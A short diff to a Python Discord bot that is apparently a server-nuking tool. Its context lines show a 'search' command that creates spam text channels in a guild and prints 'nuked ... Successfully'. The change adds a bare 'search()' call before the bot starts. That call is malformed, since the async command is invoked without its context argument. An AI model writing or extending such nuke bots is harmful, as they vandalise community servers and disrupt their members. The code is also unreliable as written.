@@ -87,6 +87,7 @@ async def search(ctx):
         await guild.create_text_channel(random.choice(SPAM_CHANNEL))
     print(f"nuked {guild.name} Successfully.")
     return
-
+  
+search()
 
 bot.run(getenv('TOKEN'))
